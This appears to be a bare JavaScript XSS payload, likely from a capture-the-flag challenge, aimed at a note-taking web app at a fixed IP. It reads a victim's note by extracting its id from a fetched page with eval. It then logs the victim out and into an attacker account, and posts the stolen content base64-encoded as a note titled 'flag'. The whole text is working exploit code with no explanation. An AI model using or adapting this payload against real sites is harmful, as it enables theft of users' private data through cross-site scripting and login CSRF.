fetch("http://211.239.124.243:18603/?").then(x=>x.text()).then(x=>eval("a=x.substring(x.indexOf('/read?id=')+9,x.indexOf('/read?id=')+73)"));
fetch("http://211.239.124.243:18603/read/"+a+"?").then(x=>x.text()).then(x=>eval(data=JSON.stringify(x)));
for(i=0;i<10000000;i++){}
fetch("http://211.239.124.243:18603/logout?");
for(i=0;i<10000000000;i++){}
fetch("http://211.239.124.243:18603/login?",{body:"username=sdfsadfasdfasfd&password=sdfsadfasdfasfd",headers:{"Content-Type":"application/x-www-form-urlencoded"},method:"post",});
for(i=0;i<10000000;i++){}
fetch("http://211.239.124.243:18603/write?",{body:"title=flag&content="+btoa(data),headers:{"Content-Type":"application/x-www-form-urlencoded"},method:"post",});
